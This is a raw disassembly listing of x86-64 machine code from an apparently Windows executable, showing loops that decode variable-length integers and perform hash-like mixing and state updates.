   140048f30:	lea    r14,[rbp+0xd10]
   140048f37:	mov    ecx,0xc8
   140048f3c:	mov    rdi,r14
   140048f3f:	lea    rsi,[rbp+0x7d8]
   140048f46:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140048f48:	mov    rcx,QWORD PTR [rbp+0x1180]
   140048f4f:	mov    rdx,r15
   140048f52:	call   0x14006f7f7
   140048f57:	mov    rax,QWORD PTR [rbp+0x1170]
   140048f5e:	mov    QWORD PTR [r13-0x8],rax
   140048f62:	mov    ecx,0xc8
   140048f67:	mov    rdi,r13
   140048f6a:	mov    rsi,r14
   140048f6d:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140048f6f:	mov    rcx,QWORD PTR [r13+0x38]
   140048f73:	mov    rdx,QWORD PTR [rbp+0xf78]
   140048f7a:	add    rdx,0x6
   140048f7e:	movabs rax,0xefd0642cdaf7144e
   140048f88:	mov    r10,QWORD PTR [rbp+0x6b8]
   140048f8f:	xor    r10,rax
   140048f92:	mov    QWORD PTR [rbp+0xf78],rdx
   140048f99:	mov    rax,rdx
   140048f9c:	movabs rdx,0x32a27dbe0b6bcf37
   140048fa6:	imul   rax,rdx
   140048faa:	movabs r8,0xf8458a6767eb0000
   140048fb4:	add    r8,rax
   140048fb7:	rol    r8,0x20
   140048fbb:	mov    r9,QWORD PTR [rbp+0x5e0]
   140048fc2:	xor    r8,r9
   140048fc5:	or     r9,0x1
   140048fc9:	rol    r9,0x15
   140048fcd:	push   0x7
   140048fcf:	pop    rdx
   140048fd0:	mov    QWORD PTR [rbp+0x5d0],r9
   140048fd7:	mov    QWORD PTR [rbp+0x380],r8
   140048fde:	mov    QWORD PTR [rbp+0x6b8],r10
   140048fe5:	mov    rax,r10
   140048fe8:	sub    edx,0x1
   140048feb:	jb     0x140049022
   140048fed:	mov    r10,r9
   140048ff0:	xor    r10,r8
   140048ff3:	add    r10,rax
   140048ff6:	rol    r10,0x28
   140048ffa:	add    r8,r10
   140048ffd:	rol    r8,0xf
   140049001:	mov    rax,r8
   140049004:	shr    rax,0x1d
   140049008:	xor    r8,rax
   14004900b:	movabs rax,0x79ca1cd2f36bd757
   140049015:	imul   r10,rax
   140049019:	add    r9,QWORD PTR [rbp+0x5d0]
   140049020:	jmp    0x140048fe5
   140049022:	xor    rax,r8
   140049025:	shr    rax,0x20
   140049029:	xor    r15d,r15d
   14004902c:	push   0x3d
   14004902e:	pop    r8
   140049030:	xor    edx,edx
   140049032:	div    r8d
   140049035:	mov    r8,QWORD PTR [rbp+0xf78]
   14004903c:	lea    r9,[r8*4+0x0]
   140049044:	mov    QWORD PTR [rbp+0x1168],rdx
   14004904b:	lea    rax,[rdx+r8*4]
   14004904f:	add    rax,0x8
   140049053:	sub    rcx,rax
   140049056:	cmovb  rcx,r15
   14004905a:	lea    rax,[r8*4+0x8]
   140049062:	mov    QWORD PTR [rbp+0x388],rax
   140049069:	cmp    rcx,0x1
   14004906d:	adc    rcx,0x0
   140049071:	mov    rax,rcx
   140049074:	xor    edx,edx
   140049076:	div    r8
   140049079:	mov    QWORD PTR [rbp+0x1140],rax
   140049080:	lea    rcx,[rbp+0x500]
   140049087:	mov    r12,rcx
   14004908a:	mov    QWORD PTR [rbp+0x4e0],r9
   140049091:	mov    rdx,r9
   140049094:	call   0x14003c111
   140049099:	xorps  xmm7,xmm7
   14004909c:	push   0x4
   14004909e:	pop    rdi
   14004909f:	mov    QWORD PTR [rbp+0x1180],0x0
   1400490aa:	mov    rax,QWORD PTR [rbp+0x1180]
   1400490b1:	cmp    rax,QWORD PTR [rbp+0x4e0]
   1400490b8:	je     0x1400496c3
   1400490be:	mov    r8,QWORD PTR [rbp+0x888]
   1400490c5:	mov    r9,QWORD PTR [rbp+0x890]
   1400490cc:	lea    rax,[r8+0x8]
   1400490d0:	cmp    rax,r9
   1400490d3:	jbe    0x1400490dc
   1400490d5:	xor    edx,edx
   1400490d7:	jmp    0x1400496af
   1400490dc:	mov    rax,QWORD PTR [rbp+0x880]
   1400490e3:	cmp    rax,0x8
   1400490e7:	jae    0x14004963a
   1400490ed:	mov    rcx,QWORD PTR [rbp+0x820]
   1400490f4:	cmp    rcx,QWORD PTR [rbp+0x828]
   1400490fb:	jae    0x140049142
   1400490fd:	mov    rcx,QWORD PTR [rbp+0x7d8]
   140049104:	mov    rdx,QWORD PTR [rbp+0x818]
   14004910b:	cmp    rdx,rcx
   14004910e:	jae    0x140049142
   140049110:	mov    rax,QWORD PTR [rbp+0x1170]
   140049117:	movzx  esi,BYTE PTR [rax+rdx*1]
   14004911b:	and    esi,0x7f
   14004911e:	lea    rax,[rdx+0x1]
   140049122:	cmp    rax,rcx
   140049125:	jae    0x140049150
   140049127:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   14004912d:	test   r8b,r8b
   140049130:	jns    0x14004914a
   140049132:	shl    rsi,0x7
   140049136:	and    r8d,0x7f
   14004913a:	or     rsi,r8
   14004913d:	mov    rdx,rax
   140049140:	jmp    0x14004911e
   140049142:	xor    r11d,r11d
   140049145:	jmp    0x1400495bc
   14004914a:	inc    rdx
   14004914d:	mov    rcx,rdx
   140049150:	mov    QWORD PTR [rbp+0x818],rcx
   140049157:	mov    rax,rsi
   14004915a:	shr    rax,0x8
   14004915e:	mov    r14,rsi
   140049161:	shr    r14,0x28
   140049165:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004916c:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140049173:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004917a:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140049181:	mov    DWORD PTR [rbp+0xd10],eax
   140049187:	lea    rax,[rip+0x3eeca]        # 0x140088058
   14004918e:	mov    QWORD PTR [rsp+0x20],rax
   140049193:	lea    rcx,[rbp+0xf80]
   14004919a:	mov    rdx,rdi
   14004919d:	lea    r8,[rbp+0xd10]
   1400491a4:	mov    r9,rdi
   1400491a7:	call   0x1400638fe
   1400491ac:	mov    BYTE PTR [rbp+0xf84],r14b
   1400491b3:	mov    r13,QWORD PTR [rbp+0x7f0]
   1400491ba:	cmp    QWORD PTR [rbp+0x838],r13
   1400491c1:	jbe    0x1400492f1
   1400491c7:	mov    r9,QWORD PTR [rbp+0x7f8]
   1400491ce:	cmp    r9,0x4
   1400491d2:	ja     0x140059d9c
   1400491d8:	mov    rcx,QWORD PTR [rbp+0x800]
   1400491df:	cmp    rcx,0x5
   1400491e3:	jae    0x140059dae
   1400491e9:	mov    r8,QWORD PTR [rbp+0x838]
   1400491f0:	cmp    r8,r13
   1400491f3:	je     0x140059dbc
   1400491f9:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140049200:	mov    cl,BYTE PTR [rbp+0x808]
   140049206:	rol    eax,cl
   140049208:	sub    r8,r13
   14004920b:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140049213:	xor    edx,edx
   140049215:	div    r8
   140049218:	mov    r14,rdx
   14004921b:	mov    rax,QWORD PTR [rbp+0x840]
   140049222:	mov    QWORD PTR [rbp+0x1060],rax
   140049229:	cmp    r13,0x40
   14004922d:	push   0x40
   14004922f:	pop    rax
   140049230:	cmovae r13,rax
   140049234:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   14004923b:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140049242:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140049249:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140049250:	lea    rcx,[rbp+0xd10]
   140049257:	mov    rdx,r13
   14004925a:	call   0x14003c0b8
   14004925f:	mov    r10,QWORD PTR [rbp+0x838]
   140049266:	test   r10,r10
   140049269:	je     0x1400492b7
   14004926b:	mov    rcx,rax
   14004926e:	mov    r8,rdx
   140049271:	mov    rax,rdx
   140049274:	add    rax,r14
   140049277:	mov    r9,QWORD PTR [rbp+0x830]
   14004927e:	cmp    rax,r10
   140049281:	jbe    0x1400492a1
   140049283:	xor    r11d,r11d
   140049286:	cmp    r8,r11
   140049289:	je     0x1400492b7
   14004928b:	lea    rax,[r11+r14*1]
   14004928f:	xor    edx,edx
   140049291:	div    r10
   140049294:	mov    al,BYTE PTR [r9+rdx*1]
   140049298:	mov    BYTE PTR [rcx+r11*1],al
   14004929c:	inc    r11
   14004929f:	jmp    0x140049286
   1400492a1:	add    r9,r14
   1400492a4:	xor    eax,eax
   1400492a6:	cmp    r8,rax
   1400492a9:	je     0x1400492b7
   1400492ab:	mov    dl,BYTE PTR [r9+rax*1]
   1400492af:	mov    BYTE PTR [rcx+rax*1],dl
   1400492b2:	inc    rax
   1400492b5:	jmp    0x1400492a6
   1400492b7:	mov    rcx,QWORD PTR [rbp+0x7e8]
   1400492be:	xor    eax,eax
   1400492c0:	cmp    r13,rax
   1400492c3:	je     0x1400492f1
   1400492c5:	cmp    rcx,0x3f
   1400492c9:	ja     0x140059d8e
   1400492cf:	mov    edx,eax
   1400492d1:	and    edx,0x7
   1400492d4:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   1400492db:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   1400492e2:	inc    rax
   1400492e5:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   1400492ec:	inc    rcx
   1400492ef:	jmp    0x1400492c0
   1400492f1:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   1400492f8:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   1400492ff:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140049306:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004930d:	xor    eax,eax
   14004930f:	cmp    rax,0x40
   140049313:	je     0x14004932b
   140049315:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004931c:	bswap  ecx
   14004931e:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140049325:	add    rax,0x4
   140049329:	jmp    0x14004930f
   14004932b:	movups xmm0,XMMWORD PTR [rbp+0x848]
   140049332:	mov    eax,DWORD PTR [rbp+0x858]
   140049338:	movups XMMWORD PTR [rbp+0xd10],xmm0
   14004933f:	mov    DWORD PTR [rbp+0xd20],eax
   140049345:	and    DWORD PTR [rbp+0xd24],0x0
   14004934c:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140049353:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004935a:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140049361:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140049368:	lea    rax,[rbp+0xd28]
   14004936f:	movups XMMWORD PTR [rax+0x30],xmm3
   140049373:	movups XMMWORD PTR [rax+0x20],xmm2
   140049377:	movups XMMWORD PTR [rax+0x10],xmm1
   14004937b:	movups XMMWORD PTR [rax],xmm0
   14004937e:	call   0x140064214
   140049383:	mov    al,BYTE PTR [rip+0x4f704]        # 0x140098a8d
   140049389:	cmp    al,0x1
   14004938b:	je     0x1400493d4
   14004938d:	movzx  eax,al
   140049390:	cmp    eax,0x2
   140049393:	je     0x14004947a
   140049399:	and    DWORD PTR [rbp+0x400],0x0
   1400493a0:	lea    rcx,[rip+0xfffffffffffb7cd9]        # 0x140001080
   1400493a7:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400493ae:	push   0x40
   1400493b0:	pop    r8
   1400493b2:	lea    r9,[rbp+0x400]
   1400493b9:	call   QWORD PTR [rip+0x4b449]        # 0x140094808
   1400493bf:	test   eax,eax
   1400493c1:	sete   cl
   1400493c4:	inc    cl
   1400493c6:	mov    BYTE PTR [rip+0x4f6c1],cl        # 0x140098a8d
   1400493cc:	test   eax,eax
   1400493ce:	je     0x14004947a
   1400493d4:	mov    al,BYTE PTR [rip+0x4f7de]        # 0x140098bb8
   1400493da:	cmp    al,0x1
   1400493dc:	je     0x140049401
   1400493de:	movzx  eax,al
   1400493e1:	test   eax,eax
   1400493e3:	jne    0x14004947a
   1400493e9:	call   0x140065d51
   1400493ee:	test   rax,rax
   1400493f1:	sete   cl
   1400493f4:	inc    cl
   1400493f6:	mov    BYTE PTR [rip+0x4f7bc],cl        # 0x140098bb8
   1400493fc:	test   rax,rax
   1400493ff:	je     0x14004947a
   140049401:	call   0x140064227
   140049406:	mov    eax,0xc8c291de
   14004940b:	xchg   DWORD PTR [rip+0x4f6cf],eax        # 0x140098ae0
   140049411:	call   QWORD PTR [rip+0x4b239]        # 0x140094650
   140049417:	mov    eax,eax
   140049419:	mov    QWORD PTR [rip+0x4ebe0],rax        # 0x140098000
   140049420:	lea    rcx,[rbp+0xd10]
   140049427:	push   0xffffffffffffffff
   140049429:	pop    rdx
   14004942a:	call   0x14002b840
   14004942f:	xor    eax,eax
   140049431:	xchg   DWORD PTR [rip+0x4f6a9],eax        # 0x140098ae0
   140049437:	mov    BYTE PTR [rip+0x4f650],0x0        # 0x140098a8e
   14004943e:	mov    eax,DWORD PTR [rbp+0xd10]
   140049444:	add    DWORD PTR [rbp+0x848],eax
   14004944a:	mov    eax,DWORD PTR [rbp+0xd14]
   140049450:	add    DWORD PTR [rbp+0x84c],eax
   140049456:	mov    eax,DWORD PTR [rbp+0xd18]
   14004945c:	add    DWORD PTR [rbp+0x850],eax
   140049462:	mov    eax,DWORD PTR [rbp+0xd1c]
   140049468:	add    DWORD PTR [rbp+0x854],eax
   14004946e:	mov    eax,DWORD PTR [rbp+0xd20]
   140049474:	add    DWORD PTR [rbp+0x858],eax
   14004947a:	mov    BYTE PTR [rip+0x4f60b],0x0        # 0x140098a8c
   140049481:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140049488:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   14004948f:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140049496:	xor    eax,eax
   140049498:	cmp    rax,0x14
   14004949c:	je     0x1400494b4
   14004949e:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   1400494a5:	bswap  ecx
   1400494a7:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   1400494ae:	add    rax,0x4
   1400494b2:	jmp    0x140049498
   1400494b4:	mov    r8,QWORD PTR [rbp+0x7e0]
   1400494bb:	mov    eax,esi
   1400494bd:	shr    eax,0x3
   1400494c0:	and    eax,0x1f
   1400494c3:	lea    rcx,[rax+rbp*1]
   1400494c7:	add    rcx,0xd10
   1400494ce:	xor    r9d,r9d
   1400494d1:	xor    edx,edx
   1400494d3:	xor    eax,eax
   1400494d5:	cmp    r9,0x10
   1400494d9:	je     0x1400494f4
   1400494db:	shld   rax,rdx,0x8
   1400494e0:	mov    r10,rdx
   1400494e3:	shl    r10,0x8
   1400494e7:	movzx  edx,BYTE PTR [rcx+r9*1]
   1400494ec:	inc    r9
   1400494ef:	or     rdx,r10
   1400494f2:	jmp    0x1400494d5
   1400494f4:	push   0xffffffffffffffff
   1400494f6:	pop    r9
   1400494f8:	mov    r10,r9
   1400494fb:	mov    ecx,r8d
   1400494fe:	shl    r10,cl
   140049501:	cmp    r8,0x40
   140049505:	not    r10
   140049508:	cmovae r10,r9
   14004950c:	and    esi,0x7
   14004950f:	lea    ecx,[r8+rsi*1]
   140049513:	neg    cl
   140049515:	shrd   rdx,rax,cl
   140049519:	shr    rax,cl
   14004951c:	test   cl,0x40
   14004951f:	cmove  rax,rdx
   140049523:	and    rax,r10
   140049526:	mov    rsi,QWORD PTR [rbp+0x820]
   14004952d:	add    r8,0x7
   140049531:	bswap  rax
   140049534:	shr    r8,0x3
   140049538:	mov    QWORD PTR [rbp+0x1060],rax
   14004953f:	mov    r9,rsi
   140049542:	imul   r9,r8
   140049546:	push   0x8
   140049548:	pop    rcx
   140049549:	sub    rcx,r8
   14004954c:	dec    r8
   14004954f:	lea    rax,[rbp+0x85c]
   140049556:	lea    r11,[rax+r9*1]
   14004955a:	mov    rax,r9
   14004955d:	xor    edx,edx
   14004955f:	push   0x14
   140049561:	pop    r14
   140049563:	div    r14
   140049566:	cmp    rcx,0x8
   14004956a:	je     0x140049590
   14004956c:	cmp    r8,0x7
   140049570:	ja     0x140059d80
   140049576:	imul   rax,rax,0xffffffffffffffec
   14004957a:	mov    al,BYTE PTR [r11+rax*1]
   14004957e:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140049585:	inc    rcx
   140049588:	inc    r11
   14004958b:	inc    r9
   14004958e:	jmp    0x14004955a
   140049590:	mov    r11,QWORD PTR [rbp+0x1060]
   140049597:	bswap  r11
   14004959a:	and    r11,r10
   14004959d:	inc    rsi
   1400495a0:	mov    QWORD PTR [rbp+0x820],rsi
   1400495a7:	mov    r9,QWORD PTR [rbp+0x890]
   1400495ae:	mov    rax,QWORD PTR [rbp+0x880]
   1400495b5:	mov    r8,QWORD PTR [rbp+0x888]
   1400495bc:	mov    rdx,r9
   1400495bf:	sub    rdx,r8
   1400495c2:	sub    rdx,rax
   1400495c5:	mov    rcx,QWORD PTR [rbp+0x7e0]
   1400495cc:	cmp    rdx,rcx
   1400495cf:	cmovae rdx,rcx
   1400495d3:	cmp    rdx,0x1
   1400495d7:	adc    rdx,0x0
   1400495db:	mov    r10d,ecx
   1400495de:	sub    r10d,edx
   1400495e1:	and    r10b,0x3f
   1400495e5:	cmp    rcx,rdx
   1400495e8:	movzx  ecx,r10b
   1400495ec:	cmovbe ecx,r15d
   1400495f0:	shr    r11,cl
   1400495f3:	mov    r10,QWORD PTR [rbp+0x870]
   1400495fa:	mov    rsi,QWORD PTR [rbp+0x878]
   140049601:	mov    ecx,edx
   140049603:	shld   rsi,r10,cl
   140049607:	shl    r10,cl
   14004960a:	test   dl,0x40
   14004960d:	cmovne rsi,r10
   140049611:	mov    ecx,0x0
   140049616:	cmove  rcx,r10
   14004961a:	or     rcx,r11
   14004961d:	mov    QWORD PTR [rbp+0x878],rsi
   140049624:	mov    QWORD PTR [rbp+0x870],rcx
   14004962b:	add    rax,rdx
   14004962e:	mov    QWORD PTR [rbp+0x880],rax
   140049635:	jmp    0x1400490e3
   14004963a:	add    rax,0xfffffffffffffff8
   14004963e:	mov    QWORD PTR [rbp+0x880],rax
   140049645:	mov    r9,QWORD PTR [rbp+0x878]
   14004964c:	mov    r10,r9
   14004964f:	mov    ecx,eax
   140049651:	shr    r10,cl
   140049654:	mov    r11,QWORD PTR [rbp+0x870]
   14004965b:	mov    rdx,r11
   14004965e:	shrd   rdx,r9,cl
   140049662:	push   0xffffffffffffffff
   140049664:	pop    r14
   140049666:	mov    rsi,r14
   140049669:	shl    rsi,cl
   14004966c:	test   al,0x40
   14004966e:	cmovne rdx,r10
   140049672:	mov    ecx,0x0
   140049677:	cmove  rcx,rsi
   14004967b:	cmove  rsi,r14
   14004967f:	not    rsi
   140049682:	not    rcx
   140049685:	and    rcx,r11
   140049688:	and    rsi,r9
   14004968b:	test   rax,rax
   14004968e:	cmove  rsi,rax
   140049692:	cmove  rcx,rax
   140049696:	mov    QWORD PTR [rbp+0x870],rcx
   14004969d:	mov    QWORD PTR [rbp+0x878],rsi
   1400496a4:	add    r8,0x8
   1400496a8:	mov    QWORD PTR [rbp+0x888],r8
   1400496af:	inc    QWORD PTR [rbp+0x1180]
   1400496b6:	mov    rcx,r12
   1400496b9:	call   0x14003c141
   1400496be:	jmp    0x1400490aa
   1400496c3:	mov    rax,QWORD PTR [rbp+0x500]
   1400496ca:	mov    QWORD PTR [rbp+0x1160],rax
   1400496d1:	mov    rax,QWORD PTR [rbp+0x508]
   1400496d8:	mov    QWORD PTR [rbp+0x1158],rax
   1400496df:	mov    rax,QWORD PTR [rbp+0x510]
   1400496e6:	mov    QWORD PTR [rbp+0x1178],rax
   1400496ed:	cmp    DWORD PTR [rbp+0x1168],0x0
   1400496f4:	je     0x140049d54
   1400496fa:	lea    rcx,[rbp+0x500]
   140049701:	mov    rdx,QWORD PTR [rbp+0x1168]
   140049708:	call   0x14003c111
   14004970d:	xor    r15d,r15d
   140049710:	xorps  xmm7,xmm7
   140049713:	lea    r12,[rbp+0xf80]
   14004971a:	push   0x4
   14004971c:	pop    rdi
   14004971d:	mov    QWORD PTR [rbp+0x1180],0x0
   140049728:	mov    rax,QWORD PTR [rbp+0x1180]
   14004972f:	cmp    rax,QWORD PTR [rbp+0x1168]
   140049736:	je     0x140049d41
   14004973c:	mov    r8,QWORD PTR [rbp+0x888]
   140049743:	mov    r9,QWORD PTR [rbp+0x890]
   14004974a:	lea    rax,[r8+0x8]
   14004974e:	cmp    rax,r9
   140049751:	jbe    0x14004975a
   140049753:	xor    edx,edx
   140049755:	jmp    0x140049d29
   14004975a:	mov    rax,QWORD PTR [rbp+0x880]
   140049761:	cmp    rax,0x8
   140049765:	jae    0x140049cb4
   14004976b:	mov    rcx,QWORD PTR [rbp+0x820]
   140049772:	cmp    rcx,QWORD PTR [rbp+0x828]
   140049779:	jae    0x1400497c0
   14004977b:	mov    rcx,QWORD PTR [rbp+0x7d8]
   140049782:	mov    rdx,QWORD PTR [rbp+0x818]
   140049789:	cmp    rdx,rcx
   14004978c:	jae    0x1400497c0
   14004978e:	mov    rax,QWORD PTR [rbp+0x1170]
   140049795:	movzx  esi,BYTE PTR [rax+rdx*1]
   140049799:	and    esi,0x7f
   14004979c:	lea    rax,[rdx+0x1]
   1400497a0:	cmp    rax,rcx
   1400497a3:	jae    0x1400497ce
   1400497a5:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   1400497ab:	test   r8b,r8b
   1400497ae:	jns    0x1400497c8
   1400497b0:	shl    rsi,0x7
   1400497b4:	and    r8d,0x7f
   1400497b8:	or     rsi,r8
   1400497bb:	mov    rdx,rax
   1400497be:	jmp    0x14004979c
   1400497c0:	xor    r11d,r11d
   1400497c3:	jmp    0x140049c36
   1400497c8:	inc    rdx
   1400497cb:	mov    rcx,rdx
   1400497ce:	mov    QWORD PTR [rbp+0x818],rcx
   1400497d5:	mov    rax,rsi
   1400497d8:	shr    rax,0x8
   1400497dc:	mov    r14,rsi
   1400497df:	shr    r14,0x28
   1400497e3:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   1400497ea:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   1400497f1:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   1400497f8:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   1400497ff:	mov    DWORD PTR [rbp+0xd10],eax
   140049805:	lea    rax,[rip+0x3e84c]        # 0x140088058
   14004980c:	mov    QWORD PTR [rsp+0x20],rax
   140049811:	mov    rcx,r12
   140049814:	mov    rdx,rdi
   140049817:	lea    r8,[rbp+0xd10]
   14004981e:	mov    r9,rdi
   140049821:	call   0x1400638fe
   140049826:	mov    BYTE PTR [rbp+0xf84],r14b
   14004982d:	mov    r13,QWORD PTR [rbp+0x7f0]
   140049834:	cmp    QWORD PTR [rbp+0x838],r13
   14004983b:	jbe    0x14004996b
   140049841:	mov    r9,QWORD PTR [rbp+0x7f8]
   140049848:	cmp    r9,0x4
   14004984c:	ja     0x140059d9c
   140049852:	mov    rcx,QWORD PTR [rbp+0x800]
   140049859:	cmp    rcx,0x5
   14004985d:	jae    0x140059dae
   140049863:	mov    r8,QWORD PTR [rbp+0x838]
   14004986a:	cmp    r8,r13
   14004986d:	je     0x140059dbc
   140049873:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14004987a:	mov    cl,BYTE PTR [rbp+0x808]
   140049880:	rol    eax,cl
   140049882:	sub    r8,r13
   140049885:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   14004988d:	xor    edx,edx
   14004988f:	div    r8
   140049892:	mov    r14,rdx
   140049895:	mov    rax,QWORD PTR [rbp+0x840]
   14004989c:	mov    QWORD PTR [rbp+0x1060],rax
   1400498a3:	cmp    r13,0x40
   1400498a7:	push   0x40
   1400498a9:	pop    rax
   1400498aa:	cmovae r13,rax
   1400498ae:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   1400498b5:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   1400498bc:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   1400498c3:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   1400498ca:	lea    rcx,[rbp+0xd10]
   1400498d1:	mov    rdx,r13
   1400498d4:	call   0x14003c0b8
   1400498d9:	mov    r10,QWORD PTR [rbp+0x838]
   1400498e0:	test   r10,r10
   1400498e3:	je     0x140049931
   1400498e5:	mov    rcx,rax
   1400498e8:	mov    r8,rdx
   1400498eb:	mov    rax,rdx
   1400498ee:	add    rax,r14
   1400498f1:	mov    r9,QWORD PTR [rbp+0x830]
   1400498f8:	cmp    rax,r10
   1400498fb:	jbe    0x14004991b
   1400498fd:	xor    r11d,r11d
   140049900:	cmp    r8,r11
   140049903:	je     0x140049931
   140049905:	lea    rax,[r11+r14*1]
   140049909:	xor    edx,edx
   14004990b:	div    r10
   14004990e:	mov    al,BYTE PTR [r9+rdx*1]
   140049912:	mov    BYTE PTR [rcx+r11*1],al
   140049916:	inc    r11
   140049919:	jmp    0x140049900
   14004991b:	add    r9,r14
   14004991e:	xor    eax,eax
   140049920:	cmp    r8,rax
   140049923:	je     0x140049931
   140049925:	mov    dl,BYTE PTR [r9+rax*1]
   140049929:	mov    BYTE PTR [rcx+rax*1],dl
   14004992c:	inc    rax
   14004992f:	jmp    0x140049920
   140049931:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140049938:	xor    eax,eax
   14004993a:	cmp    r13,rax
   14004993d:	je     0x14004996b
   14004993f:	cmp    rcx,0x3f
   140049943:	ja     0x140059d8e
   140049949:	mov    edx,eax
   14004994b:	and    edx,0x7
   14004994e:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140049955:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   14004995c:	inc    rax
   14004995f:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140049966:	inc    rcx
   140049969:	jmp    0x14004993a
   14004996b:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140049972:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140049979:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140049980:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140049987:	xor    eax,eax
   140049989:	cmp    rax,0x40
   14004998d:	je     0x1400499a5
   14004998f:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140049996:	bswap  ecx
   140049998:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004999f:	add    rax,0x4
   1400499a3:	jmp    0x140049989
   1400499a5:	movups xmm0,XMMWORD PTR [rbp+0x848]
   1400499ac:	mov    eax,DWORD PTR [rbp+0x858]
   1400499b2:	movups XMMWORD PTR [rbp+0xd10],xmm0
   1400499b9:	mov    DWORD PTR [rbp+0xd20],eax
   1400499bf:	and    DWORD PTR [rbp+0xd24],0x0
   1400499c6:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   1400499cd:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   1400499d4:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   1400499db:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   1400499e2:	lea    rax,[rbp+0xd28]
   1400499e9:	movups XMMWORD PTR [rax+0x30],xmm3
   1400499ed:	movups XMMWORD PTR [rax+0x20],xmm2
   1400499f1:	movups XMMWORD PTR [rax+0x10],xmm1
   1400499f5:	movups XMMWORD PTR [rax],xmm0
   1400499f8:	call   0x140064214
   1400499fd:	mov    al,BYTE PTR [rip+0x4f08a]        # 0x140098a8d
   140049a03:	cmp    al,0x1
   140049a05:	je     0x140049a4e
   140049a07:	movzx  eax,al
   140049a0a:	cmp    eax,0x2
   140049a0d:	je     0x140049af4
   140049a13:	and    DWORD PTR [rbp+0x400],0x0
   140049a1a:	lea    rcx,[rip+0xfffffffffffb765f]        # 0x140001080
   140049a21:	mov    rdx,QWORD PTR [rbp+0x1150]
   140049a28:	push   0x40
   140049a2a:	pop    r8
   140049a2c:	lea    r9,[rbp+0x400]
   140049a33:	call   QWORD PTR [rip+0x4adcf]        # 0x140094808
   140049a39:	test   eax,eax
   140049a3b:	sete   cl
   140049a3e:	inc    cl
   140049a40:	mov    BYTE PTR [rip+0x4f047],cl        # 0x140098a8d
   140049a46:	test   eax,eax
   140049a48:	je     0x140049af4
   140049a4e:	mov    al,BYTE PTR [rip+0x4f164]        # 0x140098bb8
   140049a54:	cmp    al,0x1
   140049a56:	je     0x140049a7b
   140049a58:	movzx  eax,al
   140049a5b:	test   eax,eax
   140049a5d:	jne    0x140049af4
   140049a63:	call   0x140065d51
   140049a68:	test   rax,rax
   140049a6b:	sete   cl
   140049a6e:	inc    cl
   140049a70:	mov    BYTE PTR [rip+0x4f142],cl        # 0x140098bb8
   140049a76:	test   rax,rax
   140049a79:	je     0x140049af4
   140049a7b:	call   0x140064227
   140049a80:	mov    eax,0xc8c291de
   140049a85:	xchg   DWORD PTR [rip+0x4f055],eax        # 0x140098ae0
   140049a8b:	call   QWORD PTR [rip+0x4abbf]        # 0x140094650
   140049a91:	mov    eax,eax
   140049a93:	mov    QWORD PTR [rip+0x4e566],rax        # 0x140098000
   140049a9a:	lea    rcx,[rbp+0xd10]
   140049aa1:	push   0xffffffffffffffff
   140049aa3:	pop    rdx
   140049aa4:	call   0x14002b840
   140049aa9:	xor    eax,eax
   140049aab:	xchg   DWORD PTR [rip+0x4f02f],eax        # 0x140098ae0
   140049ab1:	mov    BYTE PTR [rip+0x4efd6],0x0        # 0x140098a8e
   140049ab8:	mov    eax,DWORD PTR [rbp+0xd10]
   140049abe:	add    DWORD PTR [rbp+0x848],eax
   140049ac4:	mov    eax,DWORD PTR [rbp+0xd14]
   140049aca:	add    DWORD PTR [rbp+0x84c],eax
   140049ad0:	mov    eax,DWORD PTR [rbp+0xd18]
   140049ad6:	add    DWORD PTR [rbp+0x850],eax
